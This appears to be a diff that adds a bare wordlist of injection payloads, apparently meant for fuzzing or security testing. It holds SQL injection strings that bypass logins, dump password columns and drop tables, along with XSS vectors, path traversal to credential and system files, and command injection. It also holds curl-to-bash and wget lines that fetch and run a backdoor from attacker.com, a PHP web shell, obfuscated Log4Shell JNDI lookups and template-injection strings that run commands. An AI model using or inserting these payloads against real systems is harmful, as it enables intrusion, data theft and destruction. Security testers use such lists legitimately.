@@ -1,0 +1,54 @@
+' OR '1'='1
+' OR 1=1--
+admin'--
+1' AND 1=1--
+1' AND SLEEP(5)--
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+../../../../etc/passwd
+..\..\..\windows\win.ini
+%2e%2e%2fetc%2fpasswd
+; ls
+| whoami
+& dir
+$(cat /etc/passwd)
+`id`
+|| ping -c 4 127.0.0.1
+> /tmp/exploit
+<?php phpinfo(); ?>
+<?php system($_GET['cmd']); ?>
+${IFS}cat${IFS}/etc/passwd
+${env:USERNAME}
+%PROGRAMFILES%
+& net user
+| powershell -c "whoami"
+; curl http://attacker.com/shell.sh | bash
+wget http://attacker.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor
+${jndi:ldap://attacker.com/a}
+<plaintext>
+<isindex>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1)>
+"><script>alert(1)</script>
+'; DROP TABLE users; --
+1; DROP TABLE users; --
+1'; DELETE FROM users; --
+1' UNION SELECT null, username, password FROM users--
+1' UNION SELECT @@version, database(), user()--
+admin' AND 1=CONVERT(int, @@version)--
+admin' AND 1= (SELECT COUNT(*) FROM information_schema.tables)--
+'; WAITFOR DELAY '0:0:5'--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database()) > 0--
+${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/}
+${${env:NaN:-j}${env:NaN:-n}${env:NaN:-d}${env:NaN:-i}:${env:NaN:-l}${env:NaN:-d}${env:NaN:-a}${env:NaN:-p}://attacker.com/}
+${${lower:jndi}:${lower:ldap}://attacker.com/}
+<%= system('cat /etc/passwd') %>
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke(null).exec("cat /etc/passwd")}
+#set($x=0){$x.getClass().forName("java.lang.Runtime").getRuntime().exec("cat /etc/passwd")}
+#{Runtime.getRuntime().exec("cat /etc/passwd")}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
